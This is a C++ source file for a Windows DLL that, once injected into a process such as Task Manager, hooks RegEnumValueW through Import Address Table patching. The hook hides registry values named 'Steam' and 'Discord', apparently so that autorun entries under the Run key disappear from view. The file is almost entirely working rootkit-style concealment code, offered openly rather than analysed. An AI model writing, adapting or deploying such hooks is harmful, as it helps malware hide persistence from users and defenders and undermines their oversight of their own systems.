// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <psapi.h>
#include <winnt.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <Windows.h>
#include <string.h>

const WCHAR* HIDDEN_REG[2] = { L"Steam", L"Discord" };

typedef LSTATUS(WINAPI* PREG_ENUM_VALUE_W)(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpValueName,
    LPDWORD lpcchValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
    );

typedef struct RegEnumResult {
    LPWSTR lpValueName;
    DWORD lpValueNameSize;
    LPBYTE lpData;
    DWORD lpDataSize;
} RegEnumResult;

PREG_ENUM_VALUE_W origRegEnumValueW = NULL;

int contains(LPWSTR lpValueName) {
    for (int i = 0; i < sizeof(HIDDEN_REG) / sizeof(WCHAR*); i++) {
        if (wcscmp(lpValueName, HIDDEN_REG[i]) == 0) {
            printf("%ls hidden\n", lpValueName);
            return 1;
        }
    }
    return 0;
}

LSTATUS WINAPI hookRegEnumValueW(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpValueName,
    LPDWORD lpcchValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
) {
    DWORD index = 0;
    WCHAR* tempLpValueName = new WCHAR[*lpcchValueName + 1];
    unsigned long maxBufferSize = *lpcchValueName;
    DWORD tempLpType;
    unsigned long defaultBufferSize = 10000;
    unsigned long maxDataBufferSize = defaultBufferSize;
    if (lpcbData != NULL) {
        maxDataBufferSize = *lpcbData;
    }
    BYTE* tempLpData = NULL;
    if (lpData != NULL && maxDataBufferSize > 0) {
        tempLpData = new BYTE[maxDataBufferSize];
    }
    LSTATUS tempRes;
    DWORD filteredResSize = 0;

    do {
        maxBufferSize = 1024;
        if (lpcbData != NULL) {
            maxDataBufferSize = *lpcbData;
        }
        else {
            maxDataBufferSize = 10000;
        }
        tempRes = origRegEnumValueW(hKey, index, tempLpValueName, &maxBufferSize, NULL, &tempLpType, tempLpData, &maxDataBufferSize);

        if (!tempRes && !contains(tempLpValueName)) {
            filteredResSize++;
        }
        if (filteredResSize > 0 && filteredResSize - 1 == dwIndex) {
            memcpy(lpValueName, tempLpValueName, maxBufferSize * sizeof(WCHAR));
            lpValueName[maxBufferSize] = L'\0';
            *lpcchValueName = maxBufferSize;
            if (lpData != NULL && lpcbData != NULL && *lpcbData != 0) {
                memcpy(lpData, tempLpData, maxDataBufferSize);
            }
            if (lpcbData != NULL) {
                *lpcbData = maxDataBufferSize;
            }
            if (lpType != NULL) {
                *lpType = tempLpType;
            }
            delete[] tempLpValueName;
            delete[] tempLpData;
            
            return tempRes;
        }
        index++;
    } while (!tempRes);

    delete[] tempLpValueName;
    delete[] tempLpData;
    return tempRes;
}

WCHAR* CopyModuleName(char* fullModuleName) {
    WCHAR* wc = new WCHAR[1000];
    char currChar = fullModuleName[0];
    int index = 0;
    while (currChar != '.') {
        wc[index] = (WCHAR)currChar;
        index++;
        currChar = fullModuleName[index];
    }
    wc[index] = L'\0';
    return wc;
}

void InstallRegEnumValueHook() {
    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), GetModuleHandle(0), &modInfo, sizeof(MODULEINFO));

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)modInfo.lpBaseOfDll;
    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((BYTE*)modInfo.lpBaseOfDll + dosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER optionalHeader = (IMAGE_OPTIONAL_HEADER)(ntHeader->OptionalHeader);
    IMAGE_IMPORT_DESCRIPTOR* importDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)((BYTE*)(modInfo.lpBaseOfDll) + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    while (importDescriptor->Characteristics) {
        IMAGE_THUNK_DATA* tableEntry = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->OriginalFirstThunk);
        IMAGE_THUNK_DATA* IATEntry = (IMAGE_THUNK_DATA*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->FirstThunk);
        IMAGE_IMPORT_BY_NAME* funcName;

        while (!(tableEntry->u1.Ordinal & IMAGE_ORDINAL_FLAG) && tableEntry->u1.AddressOfData) {
            funcName = (IMAGE_IMPORT_BY_NAME*)((BYTE*)modInfo.lpBaseOfDll + tableEntry->u1.AddressOfData);
            if (strcmp("RegEnumValueW", (char*)(funcName->Name)) == 0) {
                WCHAR* wModuleName = CopyModuleName((char*)((BYTE*)modInfo.lpBaseOfDll + importDescriptor->Name));
                origRegEnumValueW = (PREG_ENUM_VALUE_W)GetProcAddress(GetModuleHandle(wModuleName), "RegEnumValueW");
                delete[] wModuleName;
                
                DWORD oldProt;
                VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &oldProt);
                IATEntry->u1.Function = (uintptr_t)hookRegEnumValueW;
                VirtualProtect(&(IATEntry->u1.Function), sizeof(uintptr_t), oldProt, &oldProt);
                return;
            }
            tableEntry++;
            IATEntry++;
        }

        importDescriptor++;
    }
}

DWORD WINAPI main(HMODULE hModule) {
    AllocConsole();
    FILE* f;
    FILE* f2;
    freopen_s(&f, "CONOUT$", "w", stdout);
    freopen_s(&f2, "CONIN$", "r", stdin);

    InstallRegEnumValueHook(); // Can be installed on any program that reads registry with RegEnumValueW
    
    HKEY handle;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &handle);
    RegSetValueExW(handle, L"test", NULL, REG_SZ, NULL, 0); // Force Task Manager to clear its registry cache
    Sleep(1000);
    RegDeleteValueW(handle, L"test");
    RegCloseKey(handle);
    
    while (true) {}
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CloseHandle(CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)main, hModule, 0, nullptr));
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

